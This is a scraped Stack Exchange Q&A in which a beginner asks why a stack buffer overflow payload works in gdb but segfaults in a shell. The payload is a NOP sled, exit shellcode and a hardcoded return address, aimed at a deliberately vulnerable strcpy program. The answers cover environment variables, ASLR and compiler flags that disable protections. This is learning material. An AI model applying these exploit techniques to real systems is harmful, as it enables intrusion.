{
    "title": "Why does my shellcode work in gdb but not on the command line",
    "link": "https://reverseengineering.stackexchange.com/questions/16677/why-does-my-shellcode-work-in-gdb-but-not-on-the-command-line",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>So I just started with reverse engineering and have run into some issues until I recently noticed something strange. I wrote an extremely simple shellcode (exit system call) for practice and I played around with it in gdb. I use the following code to create my payload:</p>\n<pre><code>$(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\n</code></pre>\n<p>I run this payload against the following program:</p>\n<pre><code>#include &lt;string.h&gt;\n\nint main(int argc, char **argv)\n{\n  char buffer[500];\n  strcpy(buffer, argv[1]);\n}\n</code></pre>\n<p>I compiled the program with: </p>\n<pre><code>tcc -m32 -mtune=i386 -g vuln.c -fno-stack-protector\n</code></pre>\n<p>Now, here's my problem. When I run the payload against the program in gdb like this, it works perfectly.</p>\n<pre><code>(gdb) r $(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\nStarting program: /root/exploiting/a.out $(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\n[Inferior 1 (process 2573) exited normally]\n(gdb\n</code></pre>\n<p>However, if I run it on my command line:</p>\n<pre><code>root@kali:~/exploiting# ./a.out $(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\nSegmentation fault\n</code></pre>\n<p>Why does this happen? Is this supposed to happen?</p>\n</div>",
    "votes": "3",
    "answers": 3,
    "views": "8k",
    "tags": [
        "gdb"
    ],
    "user": "L. Heldt",
    "time": "Oct 31, 2017 at 18:49",
    "comments": [
        {
            "user": "Paweł Łukasik",
            "text": "<span class=\"comment-copy\">I run your code from the cmd line and don't see a Seg fault. Maybe you did something more? (I've tested on Ubuntu not Kali)</span>",
            "time": null
        },
        {
            "user": "sudhackar",
            "text": "<span class=\"comment-copy\">Unless you have leaked addresses from stack, overwriting eip with a stack address is quite unreliable. GDB has a different execution environment. One trick is to use <code>ulimit -c unlimited</code> to get a core dump on seg fault and then debug your way from there. You can then approximate the addresses from the core dump. <code>gdb a.out core</code></span>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>gdb messes with your environment variables, and could disable ASLR. Most likely, starting gdb and running ‘unset env LINES’ and ‘unset env COLUMNS’ before throwing your shellcode will make the output line up with execution outside gdb. :)</p>\n</div>",
            "votes": "4",
            "user": "Tom Cornelius",
            "time": "Oct 31, 2017 at 21:15",
            "is_accepted": true,
            "comments": []
        },
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<h1>its just about different padding size:</h1>\n<p>look this is my solution just worked fine for me\nyou add two lines for c code to just check if the esp is same as esp you found it in gdb:</p>\n<pre><code>$ vi esp.c\n</code></pre>\n<pre><code>    #include &lt;string.h&gt;\n    #include &lt;stdio.h&gt;\n    void main(int argc, char *argv[]) {\n            char buffer[100];\n            strcpy(buffer, argv[1]);\n            register int i asm(\"esp\"); //add this line \n            printf(\"$esp = %#010x\\n\", i); // and this line will print esp\n            printf(\"Done!\\n\");\n    }\n</code></pre>\n<p>after saving file \ncompile it with gcc and prevent all security levels:</p>\n<pre><code>$ gcc esp.c -o esp -fno-stack-protector -no-pie -z norelro -z execstack\n</code></pre>\n<p>you change padding length until you find same esp you got it from gdb:</p>\n<pre><code>./esp $(python -c \"print 'gdb_eip'+96*'A'\")\n</code></pre>\n<p>and now after you find fine exploit in gdb \ngo and change payload until esp = gdb esp\nchange padding until you find same esp</p>\n</div>",
            "votes": "3",
            "user": "abdullah",
            "time": "Aug 17, 2019 at 11:15",
            "is_accepted": false,
            "comments": []
        },
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I think the best way works out for me is to attach the process of the binary with gdb and using <code>setarch -R &lt;binary&gt;</code> to temporarily disable the ASLR protection only for the binary. This way the stack frame should be the same within and without gdb.</p>\n<p>Hope this helps.</p>\n</div>",
            "votes": "0",
            "user": "Bubba",
            "time": "Apr 2, 2022 at 20:56",
            "is_accepted": false,
            "comments": []
        }
    ]
}